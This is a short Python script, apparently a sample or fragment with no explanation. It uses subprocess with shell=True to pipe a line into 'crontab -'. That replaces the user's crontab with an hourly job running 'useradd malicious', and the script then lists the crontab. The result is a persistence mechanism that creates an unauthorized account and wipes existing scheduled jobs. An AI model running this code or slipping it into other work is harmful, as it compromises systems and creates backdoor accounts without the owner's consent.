import subprocess

cmd = 'echo "0 * * * * useradd malicious" | crontab -'
subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
cmd = 'crontab -l'
subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
